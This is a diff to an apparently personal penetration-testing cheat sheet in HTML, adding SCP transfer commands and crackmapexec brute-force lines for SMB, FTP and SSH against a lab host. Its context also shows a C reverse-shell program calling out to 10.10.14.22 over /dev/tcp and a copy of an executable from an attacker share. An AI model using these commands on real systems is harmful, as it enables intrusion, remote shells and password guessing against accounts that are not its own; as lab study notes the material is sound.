@@ -263,6 +263,14 @@
                 <pre><code class="language-python">copy \\10.10.14.10\SHARE\pr.exe C:\Windows\Temp\pr.exe</code></pre>
             </ul>
 
+            <ul>
+                <h2>SCP</h2>
+                <p>From Kali to Windows</p>
+                <pre><code class="language-bash">scp /ruta/en/kali/archivo.exe Nadine@10.10.10.184:"C:/Users/Nadine/Desktop/archivo.exe"</code> </pre>
+                <p>From Windows to Kali </p>
+                <pre><code class="language-cmd">scp "nadine@10.10.10.184:/C:/RecData/RecordInfoDB.db3" .</code></pre>
+            </ul>
+
             </div>    
 
             <div class="notion-header"> 
@@ -278,7 +286,9 @@ int main() {
     execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.22/8888 0>&1", NULL);
     return 0;
 }
-</code></pre>    
+</code></pre>
+                </ul> 
+            </div>   
             
             <div class="notion-header"> 
                 <h1 id="Sync clock rate">Sync clock rate (Windows)</h1>
@@ -293,6 +303,20 @@ int main() {
                     <pre><code class="language-bash">sudo ntpdate VICTIM_IP</code></pre>
                     <p>Deactivate sync</p>
                     <pre><code class="language-bash">sudo timedatectl set-ntp true</code></pre>
+                    
+                </ul>
+            </div>
+
+            <div class="notion-header"> 
+                <h1 id="Brute Force">Brute Force</h1>
+            </div>
+
+            <div class="notion-body">
+                <ul>
+                    <p>This are several ways of bruteforcing using crackmapexec</p>
+                    <pre><code class="language-bash">crackmapexec smb 10.10.10.184 -u USERNAME -p passwords.txt
+crackmapexec ftp 10.10.10.184 -u USERNAME -p passwords.txt
+crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
                     
                 </ul>
             </div>
